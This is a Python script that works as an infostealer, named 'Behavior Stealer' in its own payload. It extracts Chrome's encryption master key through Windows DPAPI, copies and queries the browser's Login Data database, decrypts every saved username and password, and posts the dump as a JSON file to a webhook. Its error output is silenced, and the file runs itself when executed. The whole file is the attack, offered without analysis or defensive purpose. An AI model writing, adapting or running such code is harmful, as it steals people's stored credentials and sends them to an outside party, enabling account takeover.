import os
import json
import shutil
import sqlite3
import base64
import win32crypt
import requests
from Cryptodome.Cipher import AES



def get_chrome_master_key():
    try:
        local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"")
        return None

def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            return decrypted_pass.decode()
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def get_chrome_passwords():
    master_key = get_chrome_master_key()
    if not master_key:
        return {}

    login_db = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    if not os.path.exists(login_db):
        print("")
        return {}

    temp_db = os.path.join(os.environ["TEMP"], "temp_chrome.db")
    shutil.copy2(login_db, temp_db)

    passwords = {}

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for origin_url, username, encrypted_password in cursor.fetchall():
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username or decrypted_password:
                passwords[origin_url] = {
                    "username": username,
                    "password": decrypted_password
                }

        cursor.close()
        conn.close()
    except Exception as e:
        print(f"")
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

    return passwords

def send_passwords_to_webhook():
    passwords = get_chrome_passwords()
    if not passwords:
        print("")
        return

    with open("passwords.json", "w", encoding="utf-8") as f:
        json.dump(passwords, f, indent=4)

    with open("passwords.json", "rb") as f:
        files = {"file": ("passwords.json", f)}
        data = {
            "content": "🔐 **Chrome Saved Passwords Dump**",
            "username": "Behavior Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"
        }
        try:
            response = requests.post(Behavior, files=files, data=data)
            print(f"")
        except Exception as e:
            print(f"")

    os.remove("passwords.json")

send_passwords_to_webhook()
